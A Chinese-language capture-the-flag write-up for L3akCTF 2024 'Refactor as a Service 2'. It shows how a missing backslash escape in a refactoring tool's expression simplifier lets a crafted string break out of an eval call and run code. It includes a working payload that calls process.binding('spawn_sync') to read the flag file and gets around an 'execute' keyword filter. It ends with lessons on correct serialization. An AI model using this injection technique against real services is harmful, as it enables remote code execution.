# L3akCTF 2024 Refactor as a Service 2 Writeup

## 题目简述

第二题仍使用 `not-a-real-refactoring-tool`，但服务端在重构前增加了：

```javascript
checkSafe(input) {
    return !input.includes("execute");
}
```

因此第一题的 `#execute` directive 无法直接出现。简单写成 `"#exe" + "cute"` 也无效：工具先扫描 directive，之后才做常量折叠，而且不会再次扫描新产生的 `#execute`。需要寻找包内另一条求值路径。

`expressionSimplifier.js` 会把可静态求值的一元或二元表达式拼成源码，再交给 `eval`。字符串序列化时转义了双引号、换行和回车，却遗漏反斜杠，由此产生字符串上下文逃逸。

## 解题过程

关键逻辑等价于：

```javascript
const value = expression.value
    .replace(/"/g, '\\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r');

const code = `"${value}"`;
eval(code);
```

构造一个一元表达式，使字符串 AST 的实际值在双引号前含一个反斜杠：

```javascript
!'hello\\"; console.log(`RCE`);//'
```

输入源码中的 `\\` 先被 JavaScript 解析成单个反斜杠。重构器随后只给 `"` 添加反斜杠，于是生成的 `eval` 源码在边界附近成为：

```javascript
"hello\\"; console.log(`RCE`);//"
```

前两个反斜杠彼此转义，紧随其后的双引号便真正结束字符串；分号后的代码进入 `eval`，末尾 `//` 吃掉工具补上的闭合引号。外层 `!` 则确保该字符串经过一元表达式简化路径。

把第一题的进程执行代码放入这个位置：

```javascript
!'hello\\";let result = process.binding(`spawn_sync`).spawn({file:`cat`,args:[`cat`,`./flag`],stdio:[{type:`pipe`,readable:true,writable:false},{type:`pipe`,readable:false,writable:true},{type:`pipe`,readable:false,writable:true}]});let output=result.output[1].toString();console.log(output)//'
```

payload 中不含小写连续字符串 `execute`，可以通过 `includes` 检查。Base64 编码后提交，表达式简化器执行注入代码并打印：

```text
L3AK{4lw4y5_r3m3mb3r_2_3sc4p3_B4cK5la5h3S!}
```

服务可能打印两次 flag，这是因为重构流水线在数组解包前后各运行一次表达式简化器，并不影响利用成立。

## 方法总结

- 禁掉一个已知 gadget 后，应继续审计整个依赖包的动态求值面，而不是只尝试同一关键字的编码绕过。
- 将 AST 字面量重新拼回源码时，必须对目标语言的所有结构字符做正确序列化；手写替换很容易漏掉反斜杠。
- 本题的完整数据流是“单引号字符串进入 AST → 不完整转义后被包进双引号 → 反斜杠抵消转义 → `eval` 字符串逃逸”。逐阶段写出实际字节比凭感觉调整斜杠更可靠。
